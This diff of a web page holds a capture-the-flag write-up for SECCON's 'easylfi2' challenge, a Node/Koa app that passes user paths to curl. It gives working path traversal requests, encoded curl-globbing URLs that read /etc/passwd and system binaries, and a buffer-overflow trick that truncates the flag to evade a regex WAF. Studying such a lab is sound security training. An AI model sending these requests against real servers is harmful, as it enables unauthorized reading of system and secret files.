@@ -13,7 +13,129 @@
 		<div class="text-custom-dynamic text-(--color-plaintext)">
 			<h1>The Ark Challenge - easylfi2</h1>
 <p>We're given the following files.</p>
-<pre class="language-js"><code class="language-js"></code></pre>
+<pre class="language-sh"><code class="language-sh">├── docker-compose.yml
+└── web
+    ├── Dockerfile
+    ├── flag.txt
+    ├── index.js
+    ├── package-lock.json
+    ├── package.json
+    └── public
+        ├── hello.html
+        └── index.html
+
+<span class="token number">3</span> directories, <span class="token number">8</span> files</code></pre>
+<p>This challenge is a sequel to <a href="../easylfi/">easylfi</a>, so I suggest reading that first. Anyway, we can see the set up is similar.</p>
+<pre class="language-docker"><code class="language-docker"><span class="token instruction"><span class="token keyword">FROM</span> node:19.6.0-slim</span>
+<span class="token instruction"><span class="token keyword">ENV</span> NODE_ENV=production</span>
+<span class="token instruction"><span class="token keyword">WORKDIR</span> /app</span>
+
+<span class="token instruction"><span class="token keyword">RUN</span> apt update &amp;&amp; apt install -y curl</span>
+
+<span class="token instruction"><span class="token keyword">COPY</span> [<span class="token string">"package.json"</span>, <span class="token string">"package-lock.json"</span>, <span class="token string">"./"</span>]</span>
+<span class="token instruction"><span class="token keyword">RUN</span> npm install --omit=dev</span>
+<span class="token instruction"><span class="token keyword">COPY</span> . .</span>
+<span class="token instruction"><span class="token keyword">RUN</span> mv flag.txt /flag.txt</span>
+
+<span class="token instruction"><span class="token keyword">USER</span> 404:404</span>
+
+<span class="token instruction"><span class="token keyword">CMD</span> [<span class="token string">"node"</span>, <span class="token string">"index.js"</span>]</span></code></pre>
+<p>However, there's a few differences. The following excerpt shows <code>index.js</code>.</p>
+<pre class="language-javascript"><code class="language-javascript"><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token punctuation">(</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"koa"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> execFile <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"util"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">promisify</span><span class="token punctuation">(</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>execFile<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">const</span> <span class="token constant">PORT</span> <span class="token operator">=</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">PORT</span> <span class="token operator">??</span> <span class="token string">"3000"</span><span class="token punctuation">;</span>
+
+<span class="token comment">// WAF</span>
+app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">ctx<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+  <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>ctx<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">SECCON{\w+}</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    ctx<span class="token punctuation">.</span>body <span class="token operator">=</span> <span class="token string">"🤔"</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">ctx</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+  <span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">decodeURI</span><span class="token punctuation">(</span>ctx<span class="token punctuation">.</span>path<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">"index.html"</span><span class="token punctuation">;</span>
+  <span class="token keyword">try</span> <span class="token punctuation">{</span>
+    <span class="token keyword">const</span> proc <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">execFile</span><span class="token punctuation">(</span>
+      <span class="token string">"curl"</span><span class="token punctuation">,</span>
+      <span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">file://</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>process<span class="token punctuation">.</span><span class="token function">cwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/public/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>path<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+      <span class="token punctuation">{</span> <span class="token literal-property property">timeout</span><span class="token operator">:</span> <span class="token number">1000</span> <span class="token punctuation">}</span>
+    <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    ctx<span class="token punctuation">.</span>type <span class="token operator">=</span> <span class="token string">"text/html; charset=utf-8"</span><span class="token punctuation">;</span>
+    ctx<span class="token punctuation">.</span>body <span class="token operator">=</span> proc<span class="token punctuation">.</span>stdout<span class="token punctuation">;</span>
+  <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    ctx<span class="token punctuation">.</span>body <span class="token operator">=</span> err<span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token constant">PORT</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>The most notable differences are:</p>
+<ol>
+<li>The templating functionality is gone.</li>
+<li>The app now runs on NodeJS/koa.</li>
+<li>The WAF now checks for the <code>/SECCON{\w+}/</code> Regex pattern instead of just a <code>SECCON</code> string.</li>
+</ol>
+<p>This means that our previous trick to get rid of <code>SECCON</code> won't work, and that the URL parsing might be slightly different. To check the new URL parsing, I recreated the <code>/etc/passwd</code> read from the previous writeup.</p>
+<h4>Request</h4>
+<pre class="language-http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/%7b%5c.%5c./%5c.%5c./etc/passwd%7d</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">localhost:3000</span></span></code></pre>
+<h4>Reponse</h4>
+<pre class="language-http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span>
+...snip...
+<span class="token header"><span class="token header-name keyword">root</span><span class="token punctuation">:</span><span class="token header-value">x:0:0:root:/root:/bin/bash</span></span>
+<span class="token header"><span class="token header-name keyword">daemon</span><span class="token punctuation">:</span><span class="token header-value">x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span></span>
+<span class="token header"><span class="token header-name keyword">bin</span><span class="token punctuation">:</span><span class="token header-value">x:2:2:bin:/bin:/usr/sbin/nologin</span></span>
+...snip...</code></pre>
+<p>Luckily it seems to function largely the same, but I did notice a difference when trying to read a file that didn't exist.</p>
+<h4>Request</h4>
+<pre class="language-http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/%7b%5c.%5c./%5c.%5c./AAAA%7d</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">localhost:3000</span></span></code></pre>
+<h4>Response</h4>
+<pre class="language-http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span>
+...snip...
+{
+    "code":37,
+    "killed":false,
+    "signal":null,
+    "cmd":"curl file:///app/public/{\\.\\./\\.\\./AAAA}",
+    "stdout":"",
+    "stderr":"curl: (37) Couldn't open file /AAAA\n"
+}</code></pre>
+<p>Interesting! In this version of the challenge errors are returned (recall in the last challenge it would just return &quot;Something went wrong&quot;). I wasn't immediately sure how this would be useful, so I moved onto testing some random ideas in the hope that useful behaviour would show itself. One of those ideas was reading a binary file and seeing if that might lead to weird changes in other bytes in the stdout. Instead, I ran into the following error.</p>
+<h4>Request</h4>
+<pre class="language-http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/%7b%5c.%5c./%5c.%5c./bin/bash%7d</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">localhost:3000</span></span></code></pre>
+<h4>Response</h4>
+<pre class="language-http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">2320251</span></span>
+...snip...
+{ 
+    "code":"ERR_CHILD_PROCESS_STDIO_MAXBUFFER",
+    "cmd":"curl file:///app/public/{\\.\\./\\.\\./bin/bash}",
+    "stdout":"ELF[...snip...]\u0000\u0000H�G\bI��H�",
+    "stderr":"  % Total    % Received % Xferd  Average Speed [...snip...] --:--:-- --:--:-- --:--:--     0"
+}</code></pre>
+<p>Notice that it tried to print the content of <code>/bin/bash</code> but couldn't print all of it? I quickly had the idea that we could use this behaviour to remove the last <code>}</code> character from the flag when reading <code>/flag.txt</code>. We can do this by:</p>
+<ol>
+<li>Reading files to fill the stdio buffer up to <code>max stdio buffer - length of the flag + 1</code>.</li>
+<li>Reading the flag.</li>
+</ol>
+<p>If this idea works, it would print the flag up to the last <code>}</code> character and then hit the <code>ERR_CHILD_PROCESS_STDIO_MAXBUFFER</code> error. This should prevent us from matching the <code>/SECCON{\w+}/</code> pattern. Through some trial and error, I was able to do this using the following request.</p>
+<h4>Request</h4>
+<pre class="language-http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/%7b%5c.%5c./%5c.%5c./bin/touch,%5c.%5c./%5c.%5c./bin/touch,%5c.%5c./%5c.%5c./bin/touch,%5c.%5c./%5c.%5c./bin/touch,%5c.%5c./%5c.%5c./bin/touch,%5c.%5c./%5c.%5c./bin/touch,%5c.%5c./%5c.%5c./bin/cat,%5c.%5c./%5c.%5c./bin/zcat,%5c.%5c./%5c.%5c./bin/zcat,%5c.%5c./%5c.%5c./bin/zcat,%5c.%5c./%5c.%5c./bin/zcat,%5c.%5c./%5c.%5c./bin/zcat,%5c.%5c./%5c.%5c./bin/zcat,%5c.%5c./%5c.%5c./bin/zcat,%5c.%5c./%5c.%5c./bin/zcat,%5c.%5c./%5c.%5c./bin/zcat,%5c.%5c./%5c.%5c./bin/zcat,%5c.%5c./%5c.%5c./bin/zcat,%5c.%5c./%5c.%5c./bin/zcat,%5c.%5c./%5c.%5c./bin/zcat,%5c.%5c./%5c.%5c./bin/zcat,%5c.%5c./%5c.%5c./bin/zcat,%5c.%5c./%5c.%5c./bin/zcat,%5c.%5c./%5c.%5c./bin/zcat,%5c.%5c./%5c.%5c./bin/zcat,%5c.%5c./%5c.%5c./bin/zcat,%5c.%5c./%5c.%5c./bin/zcat,%5c.%5c./%5c.%5c./bin/zcat,%5c.%5c./%5c.%5c./bin/zcat,%5c.%5c./%5c.%5c./usr/bin/debconf-communicate,%5c.%5c./%5c.%5c./usr/bin/debconf-communicate,%5c.%5c./%5c.%5c./usr/bin/debconf-communicate,%5c.%5c./%5c.%5c./etc/passwd,%5c.%5c./%5c.%5c./etc/timezone,%5c.%5c./%5c.%5c./etc/timezone,%5c.%5c./%5c.%5c./etc/timezone,%5c.%5c./%5c.%5c./etc/timezone,%5c.%5c./%5c.%5c./etc/timezone,%5c.%5c./%5c.%5c./etc/timezone,%5c.%5c./%5c.%5c./etc/timezone,%5c.%5c./%5c.%5c./etc/timezone,%5c.%5c./%5c.%5c.,%5c.%5c./%5c.%5c./flag.txt%7d?.json</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">localhost:3000</span></span></code></pre>
+<h4>Response</h4>
+<pre class="language-http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">2414264</span></span>
+...snip...
+{
+    "code":"ERR_CHILD_PROCESS_STDIO_MAXBUFFER",
+    "cmd":"curl file:///app/public/{\\.\\./\\.\\./bin/touch,\\.\\./\\.\\./bin/touch,\\.\\./\\.\\./bin/touch,\\.\\./\\.\\./bin/touch,\\.\\./\\.\\./bin/touch,\\.\\./\\.\\./bin/touch,\\.\\./\\.\\./bin/cat,\\.\\./\\.\\./bin/zcat,\\.\\./\\.\\./bin/zcat,\\.\\./\\.\\./bin/zcat,\\.\\./\\.\\./bin/zcat,\\.\\./\\.\\./bin/zcat,\\.\\./\\.\\./bin/zcat,\\.\\./\\.\\./bin/zcat,\\.\\./\\.\\./bin/zcat,\\.\\./\\.\\./bin/zcat,\\.\\./\\.\\./bin/zcat,\\.\\./\\.\\./bin/zcat,\\.\\./\\.\\./bin/zcat,\\.\\./\\.\\./bin/zcat,\\.\\./\\.\\./bin/zcat,\\.\\./\\.\\./bin/zcat,\\.\\./\\.\\./bin/zcat,\\.\\./\\.\\./bin/zcat,\\.\\./\\.\\./bin/zcat,\\.\\./\\.\\./bin/zcat,\\.\\./\\.\\./bin/zcat,\\.\\./\\.\\./bin/zcat,\\.\\./\\.\\./bin/zcat,\\.\\./\\.\\./usr/bin/debconf-communicate,\\.\\./\\.\\./usr/bin/debconf-communicate,\\.\\./\\.\\./usr/bin/debconf-communicate,\\.\\./\\.\\./etc/passwd,\\.\\./\\.\\./etc/timezone,\\.\\./\\.\\./etc/timezone,\\.\\./\\.\\./etc/timezone,\\.\\./\\.\\./etc/timezone,\\.\\./\\.\\./etc/timezone,\\.\\./\\.\\./etc/timezone,\\.\\./\\.\\./etc/timezone,\\.\\./\\.\\./etc/timezone,\\.\\./\\.\\.,\\.\\./\\.\\./flag.txt}",
+    "stdout":"--_curl_--file:///app/public/../../bin/touch\nELF[...snip...]--_curl_--file:///app/public/../../flag.txt\nSECCON{dummydummy",
+    "stderr":"\n[1/43]: file:///app/public/../../bin/touch[...snip...]"
+}</code></pre>
+<p>Nice! You can see in the <code>stdout</code> field of the response that we got the flag by successfully cutting the <code>}</code> off the end.</p>
 
 		</div>
 	</div>
